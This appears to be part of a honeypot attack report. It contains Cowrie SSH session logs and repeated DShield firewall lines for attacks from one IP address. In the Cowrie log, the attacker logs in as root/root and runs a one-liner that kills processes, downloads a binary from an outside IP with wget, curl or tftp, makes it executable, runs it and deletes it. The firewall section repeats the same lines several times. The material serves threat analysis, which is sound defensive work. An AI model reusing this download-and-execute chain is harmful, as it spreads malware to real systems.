{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}

```

</details>

---

COMMENTARY ON LOGS

## DShield Logs
Total DShield logs: `80`

#### The `5` sessions in this attack were logged as connection in the following DShield firewall logs:
Here is a sample of the log lines:

```log
1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
